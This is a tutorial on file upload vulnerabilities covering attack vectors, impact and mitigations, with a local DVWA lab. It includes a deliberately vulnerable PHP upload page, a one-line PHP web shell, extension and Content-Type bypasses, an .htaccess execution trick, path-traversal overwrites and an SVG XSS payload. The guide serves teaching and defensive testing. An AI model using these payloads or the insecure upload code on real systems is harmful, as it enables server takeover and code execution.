#### **File Upload Vulnerabilities:**
File upload vulnerabilities occur when a web application allows users to upload files without proper validation or security measures. Attackers can exploit these vulnerabilities to execute malicious code, deface a website, gain unauthorized access, or disrupt server operations.

---

#### **2. Common Attack Vectors**
Here are some of the primary ways attackers exploit file upload vulnerabilities:

##### **(a) Uploading Executable Files**
- Attackers may upload scripts like `.php`, `.asp`, `.jsp`, or `.exe` files.
- If the application mistakenly executes these files, it can lead to remote code execution (RCE).
- Example: Uploading a `shell.php` file that allows attackers to execute system commands.

##### **(b) Bypassing File Type Restrictions**
- Attackers can rename malicious files to bypass extensions checks (e.g., `shell.php.jpg`).
- Some applications only check the extension but not the actual content (MIME type spoofing).
- Double extension trick: `image.jpg.php` might get executed if improperly validated.

##### **(c) Overwriting Critical System Files**
- If an application stores uploaded files in sensitive directories, attackers can overwrite configuration files (e.g., `.htaccess`) to enable code execution.

##### **(d) Directory Traversal Attacks**
- If the application does not sanitize file paths, attackers can use `../` to navigate directories and overwrite existing files or access restricted files.

##### **(e) Large File Uploads (Denial of Service)**
- Attackers can upload very large files to consume server resources, leading to denial of service (DoS).

##### **(f) Client-Side Validation Bypass**
- Many web applications use JavaScript to validate file uploads, but attackers can bypass this by disabling JavaScript or modifying requests using tools like Burp Suite.

---

#### **3. Impact of File Upload Vulnerabilities**
- **Remote Code Execution (RCE):** Attackers can execute commands on the server.
- **Server Takeover:** A successful upload can provide an entry point for full server compromise.
- **Defacement:** Malicious files can be used to modify the website's content.
- **Data Breach:** Attackers can use uploaded files to exfiltrate sensitive data.
- **Denial of Service (DoS):** Uploading excessively large files can crash the server.

---

#### **4. Prevention and Mitigation Strategies**
To prevent file upload vulnerabilities, follow these best practices:

##### **(a) Restrict Allowed File Types**
- Only allow specific file types (e.g., `.jpg`, `.png`, `.pdf`) and enforce checks on both client and server-side.
- Use a whitelist approach rather than a blacklist.

##### **(b) Validate MIME Types**
- Check the actual file content (MIME type) instead of relying on file extensions.

##### **(c) Rename Uploaded Files**
- Generate random file names to prevent execution attempts (e.g., `randomstring.jpg` instead of `user_uploaded.jpg`).

##### **(d) Store Files in a Secure Directory**
- Save uploaded files outside the webroot (`/var/www/uploads` instead of `/var/www/html/uploads`).
- This prevents direct execution of uploaded files.

##### **(e) Use Secure File Permissions**
- Set proper file permissions (e.g., `chmod 640` or `chmod 600`) to prevent execution.

##### **(f) Disable Execution in Upload Directories**
- Use `.htaccess` (for Apache) or equivalent settings to prevent execution of uploaded files:
  ```apache
  <FilesMatch "\.(php|cgi|pl|exe|jsp|asp|sh)$">
      Order Allow,Deny
      Deny from all
  </FilesMatch>
  ```

##### **(g) Implement Size Restrictions**
- Set limits on file size (e.g., max `5MB`) to prevent DoS attacks.

##### **(h) Scan Uploaded Files**
- Use antivirus or malware scanning solutions to detect malicious content.

##### **(i) Log and Monitor File Uploads**
- Maintain logs of uploaded files and regularly audit them for suspicious activity.

---

Here’s how you can set up a **File Upload Vulnerability Lab** for testing.

---

## ** Lab Setup: File Upload Vulnerability Testing**
### **1️) Environment Setup**
You can use **DVWA (Damn Vulnerable Web App)** or create a custom vulnerable upload page.

#### **A. Using DVWA**
1. Install **DVWA** (Damn Vulnerable Web App) inside a Kali Linux or Ubuntu machine:
   ```bash
   sudo apt update && sudo apt install apache2 php php-mysqli mysql-server -y
   git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
   sudo chmod -R 777 /var/www/html/dvwa/
   sudo systemctl restart apache2
   ```

2. Open DVWA in your browser:  
   - URL: `http://localhost/dvwa/`
   - Default credentials:  
     ```
     Username: admin
     Password: password
     ```

3. Navigate to `DVWA Security` and set security to **low**.

4. Go to **File Upload** and try uploading different file types.

---

#### **B. Custom Vulnerable File Upload Page**
If you want to create your own vulnerable web application:

1. **Setup a PHP-based vulnerable upload page**
   - Save the following code as `upload.php` inside `/var/www/html/`
   ```php
   <?php
   if(isset($_FILES['file'])){
       $file_name = $_FILES['file']['name'];
       $file_tmp = $_FILES['file']['tmp_name'];
       move_uploaded_file($file_tmp, "uploads/".$file_name);
       echo "File uploaded: uploads/".$file_name;
   }
   ?>
   <form action="" method="POST" enctype="multipart/form-data">
       <input type="file" name="file" />
       <input type="submit" value="Upload" />
   </form>
   ```
2. **Create an upload directory** and give it write permissions:
   ```bash
   mkdir /var/www/html/uploads
   chmod -R 777 /var/www/html/uploads
   ```

3. Restart the Apache server:
   ```bash
   systemctl restart apache2
   ```

4. Open `http://localhost/upload.php` and try uploading different files.

---

## **2️) Exploitation Scenarios**
### **Scenario 1: Uploading a PHP Web Shell**
- Create a simple PHP shell and save it as `shell.php`:
  ```php
  <?php system($_GET['cmd']); ?>
  ```
- Upload `shell.php` and access it via:
  ```
  http://localhost/uploads/shell.php?cmd=whoami
  ```

---

### **Scenario 2: Bypassing File Extension Filtering**
- Rename your shell file to `shell.php.jpg`
- Use **Burp Suite** to change the `Content-Type` to `image/jpeg` before uploading.
- If successful, access it via:
  ```
  http://localhost/uploads/shell.php.jpg?cmd=id
  ```

---

### **Scenario 3: Overwriting Server Files (Directory Traversal)**
If the application doesn't validate file paths, try:
1. Uploading `../../../var/www/html/index.php` to overwrite the homepage.
2. Uploading a `.htaccess` file:
   ```
   AddType application/x-httpd-php .jpg
   ```
   - Then, upload `shell.jpg` containing PHP code.

---

### **Scenario 4: XSS via SVG Upload**
- Create an **SVG file** (`xss.svg`) containing:
  ```xml
  <svg><script>alert('XSS')</script></svg>
  ```
- Upload it and check if it executes in the browser.
---

#### **5. Tools for Testing File Upload Vulnerabilities**
Security professionals can use the following tools to test for file upload vulnerabilities:

- **Burp Suite** – Intercept and modify upload requests.
- **Metasploit** – Exploit file upload flaws.
- **OWASP ZAP** – Automated web security testing.
- **Nikto** – Scan for vulnerabilities in web servers.
- **ExifTool** – Check file metadata and possible manipulations.

---

#### **6. Conclusion**
File upload vulnerabilities are a serious threat that can lead to RCE, data breaches, and system compromise. Implementing strong validation, proper storage, and security best practices can mitigate these risks. Regular security audits and penetration testing are essential to ensuring robust defenses.
